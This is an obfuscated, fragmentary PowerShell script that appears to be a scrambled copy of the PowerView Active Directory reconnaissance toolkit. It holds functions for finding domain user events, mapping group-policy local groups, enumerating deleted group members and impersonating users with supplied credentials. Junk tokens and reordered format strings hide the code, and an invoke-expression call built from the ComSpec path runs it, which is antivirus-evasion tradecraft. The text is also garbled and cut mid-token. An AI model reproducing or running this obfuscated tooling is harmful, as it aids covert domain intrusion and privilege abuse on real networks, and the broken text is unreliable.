 &( $eNV:ComsPec[4,15,25]-JoIN'')( ((("{151}{555}{34}{656}{484}{317}{576}{156}{265}{337}{350}{186}{60}{400}{374}{49}{169}{563}{510}{28}{44}{507}{743}{638}{15}{773}{197}{298}{211}{448}{58}{275}{19}{148}{544}{758}{523}{767}{677}{343}{162}{738}{208}{345}{154}{227}{762}{239}{38}{364}{515}{324}{75}{311}{63}{256}{736}{500}{132}{644}{649}{335}{394}{472}{617}{150}{750}{312}{600}{213}{35}{210}{695}{381}{78}{123}{392}{573}{13}{222}{237}{21}{126}{134}{5}{82}{549}{637}{234}{158}{104}{127}{473}{417}{101}{665}{783}{602}{379}{667}{481}{66}{518}{274}{788}{520}{483}{314}{476}{704}{772}{680}{681}{594}{427}{300}{446}{288}{244}{232}{277}{606}{236}{646}{128}{574}{592}{76}{458}{131}{686}{389}{341}{79}{303}{505}{674}{98}{478}{332}{209}{53}{109}{280}{267}{735}{261}{611}{615}{531}{338}{181}{769}{727}{789}{292}{395}{143}{745}{554}{589}{703}{587}{248}{490}{67}{503}{20}{349}{309}{204}{153}{203}{521}{358}{741}{370}{760}{599}{559}{455}{679}{217}{115}{597}{459}{545}{346}{421}{116}{340}{792}{377}{702}{286}{220}{22}{410}{276}{342}{626}{255}{501}{316}{526}{676}{678}{568}{33}{224}{57}{173}{420}{622}{302}{431}{553}{29}{619}{240}{122}{32}{547}{647}{627}{462}{502}{624}{508}{740}{202}{604}{630}{499}{329}{23}{351}{436}{432}{687}{206}{493}{583}{258}{198}{91}{175}{430}{304}{259}{273}{9}{778}{768}{1}{359}{613}{142}{355}{586}{373}{328}{601}{469}{438}{229}{397}{511}{440}{558}{670}{556}{405}{283}{642}{465}{516}{639}{233}{726}{223}{111}{27}{471}{660}{482}{479}{11}{766}{182}{99}{759}{581}{454}{628}{278}{295}{450}{569}{690}{77}{610}{504}{463}{388}{711}{550}{657}{144}{133}{719}{428}{739}{748}{528}{176}{548}{189}{219}{281}{634}{579}{577}{744}{705}{560}{652}{706}{96}{366}{61}{282}{709}{216}{386}{138}{794}{496}{537}{755}{561}{306}{632}{10}{514}{631}{80}{136}{451}{535}{546}{718}{163}{85}{633}{708}{653}{723}{201}{39}{93}{297}{299}{157}{751}{165}{106}{566}{221}{693}{139}{682}{177}{262}{155}{361}{336}{590}{333}{777}{313}{720}{334}{775}{48}{102}{732}{532}{322}{383}{776}{764}{291}{260}{125}{160}{406}{315}{691}{565}{609}{616}{588}{715}{268}{651}{488}{468}{45}{8}{636}{353}{409}{683}{477}{212}{135}{415}{326}{402}{645}{699}{235}{215}{731}{725}{710}{422}{694}{433}{83}{369}{557}{40}{437}{384}{669}{675}{584}{205}{196}{146}{722}{305}{321}{318}{567}{746}{269}{137}{697}{650}{188}{474}{562}{603}{608}{192}{685}{411}{761}{618}{747}{105}{790}{183}{118}{284}{539}{73}{375}{59}{251}{571}{168}{661}{423}{578}{522}{519}{486}{382}{185}{95}{308}{253}{325}{625}{17}{453}{387}{294}{456}{147}{495}{14}{36}{756}{640}{56}{408}{662}{461}{701}{184}{352}{793}{475}{643}{655}{393}{307}{754}{4}{6}{376}{416}{287}{97}{141}{765}{517}{7}{403}{527}{763}{489}{445}{551}{356}{666}{285}{542}{429}{771}{330}{26}{513}{74}{94}{689}{717}{371}{648}{114}{593}{779}{179}{536}{50}{193}{635}{426}{512}{399}{254}{629}{524}{614}{108}{30}{252}{120}{68}{323}{692}{774}{51}{449}{90}{71}{485}{301}{714}{443}{170}{18}{418}{195}{152}{243}{688}{62}{595}{487}{580}{296}{607}{498}{753}{663}{728}{372}{54}{582}{25}{721}{242}{112}{757}{43}{529}{684}{460}{145}{89}{191}{787}{733}{241}{264}{290}{247}{24}{320}{46}{272}{398}{466}{88}{585}{575}{117}{612}{266}{214}{289}{480}{385}{230}{598}{424}{491}{172}{442}{659}{786}{231}{199}{541}{700}{668}{570}{161}{712}{113}{271}{742}{784}{671}{730}{319}{414}{365}{149}{327}{362}{716}{672}{2}{696}{130}{737}{791}{87}{70}{439}{621}{530}{166}{86}{564}{65}{3}{724}{552}{263}{110}{538}{425}{270}{447}{12}{250}{534}{533}{124}{620}{713}{391}{339}{194}{363}{55}{257}{452}{347}{407}{47}{103}{348}{52}{81}{441}{331}{69}{497}{540}{641}{591}{780}{596}{543}{187}{238}{310}{84}{357}{492}{367}{734}{664}{494}{178}{752}{119}{218}{506}{140}{159}{467}{245}{623}{525}{37}{698}{246}{16}{401}{749}{770}{435}{404}{228}{390}{0}{225}{64}{360}{41}{207}{100}{190}{413}{368}{444}{121}{164}{92}{31}{380}{412}{174}{107}{279}{396}{707}{171}{419}{72}{129}{785}{42}{572}{464}{673}{470}{457}{729}{180}{782}{781}{605}{434}{293}{167}{378}{249}{200}{354}{658}{344}{654}{509}{226}" -f'V{seArIJKcheIJKRarGuIJKMEIJKNtS}[(Z3b{0}{2}{1}Z3b-f S5zPrS5z,S5zrtiesS5z,S5zopeS5z)] = YoV{pIJKRoPErTIJKIIJKes} }
        if (YoV{pIJKSbIJKOUNdIJKParaMIJKETERs}[(Z3b{1}{2}{3}{0}Z3b -f S5zBaseS5z,S5zSS5z,S5zearS5z,S5zchS5z)]) { YoV{SEarCIJKHERIJKArIJKGumIJKENts}[(Z3b{1}{0}{2}Z3b -fS5zeaS5z,S5zSS5z,S5zrchBaseS5z)] = YoV{SIJKEIJKArcHbaIJKsE} }
        if (YoV{pSbIJKoUIJKNdPArIJKAIJKMETIJKeRs}[(Z3b{2}{1}{0}Z3b-f S5zerS5z,S5zvS5z,S5zSerS5z)]) { YoV{SEaIJKRcIJKHERARIJKGumeNTS}[(Z3b{2}{1}{0}Z3b-fS5zerS5z,S5zvS5z,S5zSerS5z)] = YoV{serVIJKeR} }
        if (YoV{psIJKBOuNIJKDIJKParIJKAIJKmETeRS}[(Z3b{1}{0}{2}Z3b -f S5zarchScopS5z,S5zSeS5z,S5zeS5z)]) { YoV{seIJKARCHIJKERargIJKUIJKMENts}[(Z3b{3}{0}{1}{2}Z3b-fS5zrchSS5z,S5zcS5z,S5zopeS5z,S5zSeaS5z)] = YoV{SEarIJKChScIJKoPE} }
        if (YoV{pSbOIJKUNDParIJKAMeIJKTers}[(Z3b{1}{0}{3}{2}Z3b-f S5zPS5z,S5zResultS5z,S5zSizeS5z,S5zageS5z)]) { YoV{SEIJKAIJKRIJKChErargUmeNts}[(Z3b{0}{1}{3}{2}Z3b -f S5zResS5z,S5zultPaS5z,S5zizeS5z,S5zgeSS5z)] = YoV{reSultpAIJKGIJKEIJKsIZE} }
        if (YoV{PSIJKBIJKoUNdIJKParAmETeRs}[(Z3b{3}{2}{0}{1}Z3b-fS5zverTimeLimS5z,S5zitS5z,S5zerS5z,S5zSS5z)]) { YoV{SEaRcHIJKErARguIJKMeIJKNTS}[(Z3b{4}{0}{2}{3}{1}Z3b-f S5zeS5z,S5ztS5z,S5zLS5z,S5zimiS5z,S5zServerTimS5z)] = YoV{sIJKERVERtIIJKMelIJKimIJKIT} }
        if (YoV{pSBouIJKNIJKdPIJKARaMEtErs}[(Z3b{1}{3}{2}{0}Z3b-f S5zksS5z,S5zSeS5z,S5zMasS5z,S5zcurityS5z)]) { YoV{SeaRCHERIJKArIJKgUIJKmEIJKNtS}[(Z3b{0}{2}{1}','oS5z,S5z the inS5z,S5zrect lengthS5z,S5zonS5z,S5zHoursArraS5z,S5zLS5z,S5zy isS5z)
        }

        function CoIJKNVeRTtO-lOGonIJKHOUrIJKSaIJKRIJKRAy {
            Param (
                [int[]]
                YoV{hoIJKUrIJKSARR}
            )

            YoV{LIJKoIJKGONIJKHOURS} = &(Z3b{2}{0}{1}Z3b -fS5zbS5z,S5zjectS5z,S5zNew-OS5z) (Z3b{1}{0}Z3b -f S5z[]S5z,S5zboolS5z) 24
            for(YoV{I}=0; YoV{i} -lt 3; YoV{i}++) {
                YoV{bIJKYte} = YoV{hOIJKUIJKRSarR}[YoV{i}]
                YoV{OFIJKFSeT} =','5zUserIdeS5z,S5ziS5z,S5ztyS5z)] -or YoV{pIJKsbouIJKNdparaIJKMetIJKerS}[(Z3b{0}{1}{3}{2}Z3b -fS5zUs','5zSS5z,S5zervS5z,S5zerS5z)]) { YoV{dcSEarIJKcHeIJKRArGUmIJKeIJKNTs}[(Z3b{1}{0}Z3b-f S5zerverS5z,S5zSS5z)] = YoV{SerIJKVIJKEr} }
            if (YoV{pIJKSIJKBOIJKUnDpaIJKRamIJKEteRs}[(Z3b{0}{1}{2}Z3b -f S5zCS5z,S5zrS5z,S5zedentialS5z)]) { YoV{DcsEARchIJKeRaIJKRguMIJKeNTS}[(Z3b{3}{2}{0}{1}Z3b -f S5zntiaS5z,S5zlS5z,S5zedeS5z,S5zCrS5z)] = YoV{CReIJKDEIJKNtial} }
            &(Z3b{2}{3}{4}{1}{0}Z3b -fS5zseS5z,S5zerboS5z,S5zWritS5z,S5zeS5z,S5z-VS5z) (S5z[FS5z+S5zinS5z+S5zd-DomS5z+S5zainUserS5z+S5zEvS5z+S5zent] S5z+S5zQueS5z+S5zrS5z+S5zying S5z+S5zforS5z+S5z S5z+S5zdoS5z+S5zmainS5z+S5z S5z+S5zconS5z+S5ztroS5z+S5zllers S5z+S5ziS5z+S5zn S5z+S5zdS5z+S5zomaS5z+S5zin: S5z+Z3bYoVDomainZ3b)
            YoV{TIJKAIJKRgetcOMIJKpUTeRS} = &(Z3b{0}{2}{4}{3}{5}{1}Z3b -fS5zGet-S5z,S5zrS5z,S5zDomaS5z,S5zConS5z,S5zinS5z,S5ztrolleS5z) @DCSearcherArguments JGO &(Z3b{2}{3}{1}{0}Z3b-f S5zctS5z,S5zObjeS5z,S5zSS5z,S5zelect-S5z) -ExpandProperty (Z3b{2}{0}{1}Z3b-f S5zhostnamS5z,S5zeS5z,S5zdnsS5z)
        }
        if (YoV{tIJKARgetIJKCOIJKmPuTeIJKRs} -and (YoV{TIJKARIJKgeTCoIJKmputeIJKRs} -isnot [System.Array])) {
            YoV{TaRGIJKEIJKTcOMPIJKUTers} = @(,YoV{TIJKARgEtcIJKoIJKMPutEIJKRS})
        }
        &(Z3b{1}{3}{0}{2}Z3b-fS5ze-VeS5z,S5zWriS5z,S5zrboseS5z,S5ztS5z) Z3b[Find-DomainUserEvent] TargetComputers length: YoV(YoVTargetComputers.Length) Z3b
        &(Z3b{1}{3}{0}{2}Z3b -f S5zosS5z,S5zWrS5z,S5zeS5z,S5zite-V','ztS5z,S5zere-OS5z,S5zWhS5z,S5zbjecS5z) {YoV{_}} JGO &(Z3b{3}{0}{1}{2}Z3b-fS5zrEaS5z,S5zch-ObjecS5z,S5ztS5z,S5zFoS5z) {
                    if ( (YoV{taIJKRgIJKetsIIJKds}[0] -eq S5z*S5z) -or (YoV{TArGEIJKTIJKSidS} -Contains YoV{_}) ) {
                        YoV{gIJKPOGROuP}
                    }
                }
            }
            
            if ( (YoV{gIJKPoIJKGRoUp}.Z3bGROUPIJKmEIJKMIJKBErOFZ3b -contains YoV{TARgIJKETlOCIJKAIJKlIJKsiD}) ) {
                if ( (YoV{tIJKAIJKRGeIJKTsIdS}[0] -eq S5z*S5z) -or (YoV{TaIJKRGIJKetSIIJKDS} -Contains YoV{GPIJKOgIJKRouP}.Z3bgIJKROIJKUpsIDZ3b) ) {
                    YoV{GIJKpoGRoIJKUp}
                }
            }
        } JGO &(Z3b{2}{1}{0}Z3b-f S5zctS5z,S5zort-ObjeS5z,S5zSS5z) -Property (Z3b{0}{1}{2}Z3b-f S5zGPS5z,S5zOS5z,S5zNameS5z) -Unique

        YoV{gPOIJKgrIJKOIJKUps} JGO &(Z3b{3}{2}{0}{1}Z3b-f S5zeS5z,S5zre-ObjectS5z,S5zhS5z,S5zWS5z) {YoV{_}} JGO &(Z3b{0}{3}{2}{1}Z3b -fS5zFoS5z,S5zbjectS5z,S5zach-OS5z,S5zrES5z) {
            YoV{GIJKPONIJKAMe} = YoV{_}.Z3bGPodiIJKspIJKlAIJKYNAmEZ3b
            YoV{GIJKpIJKoguID} = YoV{_}.Z3bGPonIJKAMEZ3b
            YoV{gPIJKopAIJKTh} = YoV{_}.Z3bgIJKpOpIJKAThZ3b
            YoV{gpIJKotIJKype} = YoV{_}.Z3bGpIJKOtYIJKpeZ3b
            if (YoV{_}.Z3bgIJKRoupMIJKemIJKBeRSZ3b) {
                YoV{gIJKpoIJKmeMBIJKers} = YoV{_}.Z3bgroUIJKpmEmbeIJKRsZ3b
            }
            else {
                YoV{GIJKPOMeMbIJKERs} = YoV{_}.Z3bGrouIJKPSIJKidZ3b
            }

            YoV{FILIJKTIJKErs} = YoV{_}.Z3bFiIJKLTeIJKRSZ3b

            if (YoV{taIJKRIJKgETsIDs}[0] -eq S5z*S5z) {
                
                YoV{TIJKARGeTIJKOIJKBjEIJKCtSidS} = YoV{gpIJKOIJKmemBERs}
            }
            else {
                YoV{TArgIJKeTIJKObjIJKecTSIDS} = YoV{TIJKArGetoIJKBJeIJKctsiD}
            }

            
            &(Z3b{3}{2}{1}{0}Z3b -f S5zOUS5z,S5z-DomainS5z,S5zetS5z,S5zGS5z) @CommonArguments -Raw -Properties (Z3b{2}{1}{0}{3}Z3b-fS5zstS5z,S5z,diS5z,S5zn','5zieS5z,S5zsS5z) = (Z3b{4}{5}{11}{12}{8}{3}{9}{6}{10}{13}{2}{7}{0}{1}Z3b -f S5zncipalS5z,S5znameS5z,S5zsS5z,S5zstinguiS5z,S5zsamaccS5z,S5zoS5z,S5zedS5z,S5zervicepriS5z,S5zame,diS5z,S5zshS5z,S5znS5z,S5zuS5z,S5zntnS5z,S5zame,S5z)
        }
        if (YoV{pSBoIJKUndIJKpARIJKAIJKmEIJKTers}[(Z3b{0}{1}Z3b -f S5zDomaiS5z,S5znS5z)]) { YoV{uIJKsEIJKRsIJKeaRCheRaRIJKGIJKUmeIJKNTS}[(Z3b{1}{0}Z3b-fS5zinS5z,S5zDomaS5z)] = YoV{doIJKmIJKAin} }
        if (YoV{psBIJKOunDPaIJKRaIJKMIJKETEIJKRs}[(Z3b{2}{0}{1}Z3b -f S5zFiS5z,S5zlterS5z,S5zLDAPS5z)]) { YoV{usEIJKRIJKseaRChIJKerARgIJKUmIJKenIJKTS}[(Z3b{2}{1}{0}Z3b -f S5zrS5z,S5zteS5z,S5zLDAPFilS5z)] = YoV{ldaPfIJKilIJKTIJKeR} }
        if (YoV{PSIJKBoIJKUnIJKDpaRAMEterS}[(Z3b{1}{2}{0}Z3b-f S5zseS5z,S5zSS5z,S5zearchBaS5z)]) { YoV{userSIJKEArCIJKHerARGIJKUIJKmENtS}[(Z3b{0}{1}{2}Z3b -f S5zSearcS5z,S5zhS5z,S5zBaseS5z)] = YoV{seIJKArChBIJKAIJKsE} }
        if (YoV{PSIJKBoIJKUnDPaRAIJKmETErs}[(Z3b{0}{1}{2}Z3b-fS5zSS5z,S5zerveS5z,S5zrS5z)]) { YoV{UIJKSerseAIJKRIJKcIJKheRarIJKguMenTs}[(Z3b{1}{0}Z3b-fS5zverS5z,S5zSerS5z)] = YoV{sErvIJKeR} }
        if (YoV{PsBoUIJKNIJKDPIJKArAMIJKEtErS}[(Z3b{0}{3}{2}{1}Z3b -f S5zSeS5z,S5zcopeS5z,S5zrchSS5z,S5zaS5z)]) { YoV{UsERIJKsIJKEIJKARChEIJKRarGuIJKmIJKEnts}[(Z3b{0}{3}{2}{1}Z3b-f S5zSeS5z,S5zcopeS5z,S5zrchSS5z,S5zaS5z)] = YoV{seIJKArChSIJKcoPe} }
        if (YoV{PsIJKBIJKOUNdpIJKArIJKAmetEIJKRS}[(Z3b{1}{0}{3}{2}Z3b -fS5ztPagS5z,S5zResulS5z,S5zzeS5z,S5zeSiS5z)]) { YoV{uSeRIJKSEaIJKRCHerarIJKguIJKments}[(Z3b{2}{3}{1}{0}Z3b-f S5zeSizeS5z,S5ztPagS5z,S5zRS5z,S5zesulS5z)] = YoV{ReSIJKUltIJKpAgeSIJKIZe} }
        if (YoV{PIJKSBOuIJKNDparAIJKmEtIJKeIJKRs}[(Z3b{1}{4}{0}{2}{3}Z3b-f S5zrveS5z,S5zSS5z,S5zrTS5z,S5zimeLimitS5z,S5zeS5z)]) { YoV{USERsEaIJKRchIJKEIJKRIJKAIJKRGuIJKmEntS}[(Z3b{3}{1}{0}{2}Z3b -f S5zeLiS5z,S5zverTimS5z,S5zmitS5z,S5zSerS5z)] = YoV{SIJKeRVIJKeRIJKTiMeIJKlimIt} }
        if (YoV{pSbOUndIJKPIJKAIJKRaMETIJKErs}[(Z3b{0}{1}{2}Z3b -f S5zToS5z,S5zmbstonS5z,S5zeS5z)]) { YoV{uSeRsIJKeAIJKRcIJKhIJKErIJKARIJKGUmEnts}[(Z3b{1}{0}{2}Z3b-fS5zombstS5z,S5zTS5z,S5zoneS5z)] = YoV{tOMIJKBIJKsTONe} }
        if (YoV{psbOuNDIJKpIJKARIJKAIJKmEters}[(Z3b{1}{0}{2}Z3b-f S5zdenS5z,S5zCreS5z,S5ztialS5z)]) { YoV{USEIJKRsIJKEIJKARIJKCHeRaRGumeIJKNts}[(Z3b{0}{2}{1}{3}Z3b -fS5zCredenS5z,S5ziS5z,S5ztS5z,S5zalS5z)] = YoV{CrIJKEIJKDenIJKTIAL} }

        if (YoV{PIJKSBIJKOUIJKNDpArAMEIJKTers}[(Z3b{1}{0}{2}Z3b-fS5zeS5z,S5zCrS5z,S5zdentialS5z)]) {
            YoV{LoIJKgOIJKNIJKToKeN} = &(Z3b{3}{4}{0}{1}{2}Z3b-f S5zke-UsS5z,S5zerImpersS5z,S5zonationS5z,S5zInS5z,S5zvoS5z) -Credential YoV{cRIJKEdIJKENIJKTIAl}
        }
    }

    PROCES','ameS5z,S5zinguishednameS5z) -GPLink YoV{gPIJKOGUIJKId} JGO &(Z3b{1}{0}{2}Z3b-f S5zEach-S5z,S5zForS5z,S5zObjectS5z) {
                if (YoV{fiLIJKTers}) {
                    YoV{oUCIJKOmPutIJKeIJKRs} = &(Z3b{1}{3}{0}{2}Z3b-fS5zputeS5z,S5zGet-DomaiS5z,S5zrS5z,S5znComS5z) @CommonArguments -Properties (Z3b{1}{0}{4}{3}{2}Z3b -f S5zstnS5z,S5zdnshoS5z,S5zhednameS5z,S5zstinguisS5z,S5zame,diS5z) -SearchBase YoV{_}.Z3bPIJKATHZ3b JGO &(Z3b{2}{1}{0}Z3b-f S5zObjectS5z,S5zhere-S5z,S5zWS5z) {YoV{_}.Z3bdIJKiSIJKTiIJKNGUIIJKsHIJKeDnAmEZ3b -match (YoV{FIlIJKTIJKErs}.Z3bVAIJKLuEZ3b)} JGO &(Z3b{2}{0}{1}Z3b-fS5zect-OS5z,S5zbjectS5z,S5zSelS5z) -ExpandProperty (Z3b{1}{0}{2}{3}Z3b -fS5zostS5z,S5zdnshS5z,S5znS5z,S5zameS5z)
                }
                else {
                    YoV{OUCOMpuIJKTIJKeRs} = &(Z3b{4}{3}{2}{1}{0}Z3b -fS5zrS5z,S5zteS5z,S5zinCompuS5z,S5zet-DomaS5z,S5zGS5z) @CommonArguments -Properties (Z3b{3}{0}{2}{1}Z3b -f S5zshS5z,S5ztnameS5z,S5zosS5z,S5zdnS5z) -SearchBase YoV{_}.Z3bPaIJKThZ3b JGO &(Z3b{1}{3}{0}{2}Z3b -fS5zbjS5z,S5zSelect-S5z,S5zectS5z,S5zOS5z) -ExpandProperty (Z3b{2}{1}{3}{0}Z3b-fS5zameS5z,S5zhoS5z,S5zdnsS5z,S5zstnS5z)
                }

                if (YoV{oIJKUcIJKoIJKMPUters}) {
                    if (YoV{oUCOMIJKputIJKERs} -isnot [System.Array]) {YoV{ouCIJKOIJKMPUTIJKERS} = @(YoV{OIJKUCOIJKMpuTeIJKRs})}

                    ForEach (YoV{TArGEIJKTsIJKID} in YoV{tARIJKGIJKeToIJKBjIJKECTSIDs}) {
                        YoV{ObIJKjIJKect} = &(Z3b{0}{2}{4}{1}{3}Z3b-f S5zGetS5z,S5zinObS5z,S5z-DoS5z,S5zjectS5z,S5zmaS5z) @CommonArguments -Identity YoV{TIJKArIJKGEtSid} -Properties (Z3b{5}{12}{4}{9}{8}{6}{14}{1}{13}{3}{2}{7}{11}{10}{0}Z3b-f S5zdS5z,S5zdistinS5z,S5zaS5z,S5zishednS5z,S5zunttypeS5z,S5zsamaccS5z,S5zuntS5z,S5zmeS5z,S5zsamaccoS5z,S5z,S5z,S5zjectsiS5z,S5z,obS5z,S5zoS5z,S5zguS5z,S5zname,S5z)

                        Y','uishednaS5z,S5zunttypeS5z,S5ztname,dS5z,S5zmaccoS5z,S5zcS5z,S5zcounS5z,S5zmaS5z,S5zmS5z,S5zjectS5z,S5zidS5z,S5ztS5z,S5zsaS5z,S5zsS5z)

                    YoV{iSGIJKRoup} = @((Z3b{1}{2}{0}Z3b -fS5z35456S5z,S5z2S5z,S5z684S5z),(Z3b{2}{1}{0}Z3b-fS5z7S5z,S5z3545S5z,S5z2684S5z),(Z3b{2}{0}{1}Z3b -fS5z709S5z,S5z12S5z,S5z5368S5z),(Z3b{1}{0}{2}Z3b -f S5z68709S5z,S5z53S5z,S5z13S5z)) -contains YoV{OBIJKJeIJKcT}.Z3bsaMIJKAcCoUNIJKTIJKTYpeZ3b

                    YoV{GIJKPOLoCaLGIJKRoIJKUpMAIJKPPiIJKNg} = &(Z3b{1}{3}{2}{0}Z3b-fS5zectS5z,S5zNS5z,S5zjS5z,S5zew-ObS5z) (Z3b{0}{1}{2}Z3b-f S5zPSObS5z,S5zjecS5z,S5ztS5z)
                    YoV{gPIJKOlOcalIJKgRouIJKPmIJKApPing} JGO &(Z3b{2}{0}{1}{3}Z3b-fS5zMembS5z,S5zeS5z,S5zAdd-S5z,S5zrS5z) (Z3b{1}{0}{2}Z3b-f S5zrS5z,S5zNotepropeS5z,S5ztyS5z) (Z3b{1}{3}{0}{2}Z3b -fS5zamS5z,S5zObjecS5z,S5zeS5z,S','YoV{MIJKeMBeIJKRname} = YoV{propeIJKRIJKTieS}.Z3bCNZ3b[0]
                        }
                    }

                    if (YoV{pIJKRoIJKpeIJKRtIes}.Z3bobIJKJeCTClaIJKsSZ3b -match (Z3b{1}{2}{0}Z3b -f S5zrS5z,S5zcoS5z,S5zmputeS5z)) {
                        YoV{meMbEIJKROBJIJKEIJKCTIJKclASS} = (Z3b{2}{0}{1}Z3b-fS5zpS5z,S5zuterS5z,S5zcomS5z)
                    }
                    elseif (YoV{pROpIJKEIJKRTIJKIEs}.Z3bOIJKBjIJKeCTCLASsZ3b -match (Z3b{0}{1}Z3b-fS5zgrS5z,S5zoupS5z)) {
                        YoV{mIJKEmIJKBIJKeRobJECIJKTCIJKLaSs} = (Z3b{1}{0}Z3b-f S5zpS5z,S5zgrouS5z)
                    }
                    elseif (YoV{PIJKRoIJKPEIJKRtIEs}.Z3bOBJEIJKCtcIJKLaSSZ3b -match (Z3b{1}{0}Z3b -fS5zserS5z,S5zuS5z)) {
                        YoV{MIJKEMIJKBEROBjeIJKCIJKTclIJKASs} = (Z3b{1}{0}Z3b-fS5zserS5z,S5zuS5z)
                    }
                    else {
                        YoV{MEIJKMBIJKEroBJeCTIJKcLIJKASs} = YoV{NUIJKlL}
                    }
                    YoV{gIJKRoUpmeMIJKBIJKEr} JGO &(Z3b{3}{1}{2}{0}Z3b -fS5zrS5z,S5zddS5z,S5z-MembeS5z,S5zAS5z) (Z3b{1}{0}{2}{3}Z3b -f S5zteS5z,S5zNoS5z,S5zproperS5z,S5ztyS5z) (Z3b{0}{2}{1}Z3b-f S5zMS5z,S5zinS5z,S5zemberDomaS5z) YoV{MEMBIJKErdOIJKMaIN}
                    YoV{GrIJKOIJKUpmember} JGO &(Z3b{2}{0}{1}Z3b -f S5zeS5z,S5zrS5z,S5zAdd-MembS5z) (Z3b{1}{0}{3}{2}Z3b -fS5zoteS5z,S5zNS5z,S5zpertyS5z,S5zproS5z) (Z3b{1}{2}{0}Z3b -fS5zmeS5z,S5zMemberS5z,S5zNaS5z) YoV{mIJKEmbeIJKRIJKNAme}
                    YoV{GIJKROIJKUIJKpmEMBEr} JGO &(Z3b{1}{0}{2}Z3b -f S5zMembS5z,S5zAdd-S5z,S5zerS5z) (Z3b{2}{0}{1}Z3b-fS5zpropS5z,S5zertyS5z,S5zNoteS5z) (Z3b{4}{7}{6}{1}{0}{3}{2}{5}Z3b -fS5zinguS5z,S5zrDistS5z,S5zsS5z,S5ziS5z,S5zMeS5z,S5zhedNameS5z,S5zeS5z,S5zmbS5z) YoV{MeIJKmberIJKdn}
                    YoV{GRoUIJKPIJKMemIJKBEr} JGO &(Z3b{2}{0}{1}Z3b-f S5z-MemS5z,S5zberS5z,S5zAddS5z) (Z3b{0}{2}{1}Z3b-f S5zNotepropS5z,S5zrtyS5z,S5zeS5z) (Z3b{1}{2}{4}{0}{3}Z3b -fS5zectClS5z,S5zMeS5z,S5zmS5z,S5zassS5z,S5zberObjS5z) YoV{MemBERoBjEIJKcIJKTCIJKLAss}
                    YoV{grouIJKPmIJKEmBIJKER} JGO &(Z3b{2}{1}{0}Z3b -f S5zd-MemberS5z,S5zdS5z,S5zAS5z) (Z3b{1}{2}{0}Z3b-fS5zyS5z,S5zNotepropeS5z,S5zrtS5z) (Z3b{0}{2}{1}Z3b-f S5zMeS5z,S5zberSIDS5z,S5zmS5z) YoV{meMbeIJKRsIJKiD}
                    YoV{gIJKRoUpMEmIJKBIJKer}.Z3bPsIJKOIJKBjEcTZ3b.Z3btYIJKpEnAIJKmesZ3b.(Z3b{0}{1}{2}Z3b -f S5zInsS5z,S5zeS5z,S5zrtS5z).Invoke(0, (Z3b{1}{2}{3}{0}Z3b-fS5zberS5z,S5zPowerView.GrS5z,S5zoupMeS5z,S5zmS5z))
                    YoV{grIJKOIJKUPmemBIJKER}

                    
                    if (YoV{PsbIJKOUnDIJKpaRIJKAMeTers}[(Z3b{1}{0}{2}Z3b-fS5zecuS5z,S5zRS5z,S5zrseS5z)] -and YoV{mEmIJKBeIJKRDN} -and (YoV{MemBIJKEROBjecIJKTCIJKlAIJKSS} -match (Z3b{0}{1}Z3b-f S5zgroS5z,S5zupS5z))) {
                        &(Z3b{1}{3}{0}{2}Z3b-f S5zsS5z,S5zWrS5z,S5zeS5z,S5zite-VerboS5z) (S5z[GeS5z+S5ztS5z+S5z-DS5z+S5zomaS5z+S5zinGS5z+S5zrS5z+S5zoupMember]S5z+S5z S5z+S5zManuS5z+S5zallS5z+S5zy S5z+S5zrS5z+S5zecS5z+S5zursing S5z+S5zoS5z+S5zn S5z+S5zgrouS5z+S5zp: S5z+Z3bYoVMemberDNZ3b)
                        YoV{sIJKEARChIJKErIJKARgUMEIJKNtS}[(Z3b{0}{2}{1}Z3b-f S5zIdS5z,S5zyS5z,S5zentitS5z)] = YoV{mIJKemBeRIJKDN}
                        YoV{nIJKULl} = YoV{seIJKARcHErIJKArIJKgumenTs}.(Z3b{0}{1}{2}Z3b-fS5zRemS5z,S5zovS5z,S5zeS5z).Invoke((Z3b{0}{2}{1}Z3b -fS5zPropeS5z,S5ztiesS5z,S5zrS5z))
                        &(Z3b{0}{3}{1}{2}Z3b-fS5zGet-DS5z,S5znGrS5z,S5zoupMemberS5z,S5zomaiS5z) @SearcherArguments
                    }
                }
            }
            YoV{grOIJKUpIJKsearchIJKeR}.(Z3b{2}{0}{1}Z3b-f S5ziS5z,S5zsposeS5z,S5zdS5z).Invoke()
        }
    }
}


function gEt-domAiIJKNgIJKRIJKOuPMIJKeMbeRdIJKeLEtIJKEd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{1}{7}{0}{5}{6}{2}{4}Z3b -f S5zrsS5z,S5zaS5z,S5zignmS5z,S5zPSUseDeclS5z,S5zentsS5z,S5zMoreThS5z,S5zanAssS5z,S5zredVaS5z}, S5zS5z)]
    [OutputType({Z3b{2}{3}{6}{1}{7}{5}{0}{4}{8}Z3b -f S5zeS5z,S5znGroS5z,S5zPoS5z,S5zwerS5z,S5zmbeS5z,S5zMS5z,S5zView.DomaiS5z,S5zupS5z,S5zrDeletedS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(POSitIOn = 0, vaLUeFRoMPIPelInE = YoV{tIJKRue}, vAlueFrOmpiPelINEbyProPErTYNAMe = YoV{tIJKRuE})]
        [Alias({Z3b{2}{3}{4}{1}{0}Z3b -fS5zshedNameS5z,S5ztinguiS5z,S5zDS5z,S5ziS5z,S5zsS5z}, {Z3b{1}{3}{0}{2}Z3b -f S5ztNamS5z,S5zSamAS5z,S5zeS5z,S5zccounS5z}, {Z3b{0}{1}Z3b-fS5zNS5z,S5zameS5z}, {Z3b{3}{4}{1}{2}{0}{5}Z3b-fS5zistinguiS5z,S5zbS5z,S5zerDS5z,S5zMS5z,S5zemS5z,S5zshedNameS5z}, {Z3b{1}{2}{3}{0}Z3b -fS5zeS5z,S5zMembeS5z,S5zrS5z,S5zNamS5z})]
        [String[]]
        YoV{ideIJKNtIIJKTY},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DOMaIJKin},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b-fS5zerS5z,S5zFiltS5z})]
        [String]
        YoV{lIJKDaPfilIJKTEr},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b -f S5zthS5z,S5zADSPaS5z})]
        [String]
        YoV{sIJKeArIJKcIJKHbaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{3}{0}{1}{2}Z3b-fS5zmS5z,S5zaiS5z,S5znControllerS5z,S5zDoS5z})]
        [String]
        YoV{sIJKerVIJKEr},

